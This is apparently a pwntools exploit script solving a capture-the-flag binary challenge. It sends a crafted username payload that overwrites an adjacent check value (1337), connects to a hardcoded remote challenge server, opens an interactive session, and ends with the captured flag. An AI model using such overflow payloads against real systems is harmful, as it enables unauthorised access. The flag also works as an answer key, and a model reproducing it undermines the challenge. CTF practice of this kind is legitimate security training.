# %%

from pwn import *

# ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5a320c8445c424a78f554fa7c6ab33175e11e30e, for GNU/Linux 3.2.0, not stripped

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# %%

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

# gdbscript = 'gef\ngef\n'
# gdbscript += 'set follow-fork-mode child\n'
# gdbscript += 'b main\n'
# gdbscript += 'ni\n'

# conn = gdb.debug(
#     ['./src/exploit1.bin'],
#     gdbscript=gdbscript,
# )

conn = remote('34.123.210.162', 20232)
# conn = process(['./src/exploit1.bin'])

# _pid = gdb.attach(
#     conn,
#     gdbscript=gdbscript,
# )

# %%

print("0")
# raw_input()

print("1")
conn.recvuntil(b"Choice: ")

conn.sendline(b"1")
conn.recvuntil(b"Enter new username: ")

check_num = 1337

payload = b"Guest123" + b"12345678" + b"abcdefgh"
payload += b"0000" + check_num.to_bytes(4, 'little')
print(f"{payload = }")

conn.sendline(payload)

print("2")
conn.recvuntil(b"Choice: ")
conn.sendline(b"3")

print("3")
conn.interactive()

# poctf{uwsp_5w337_c10v32_4nd_50f7_511k}
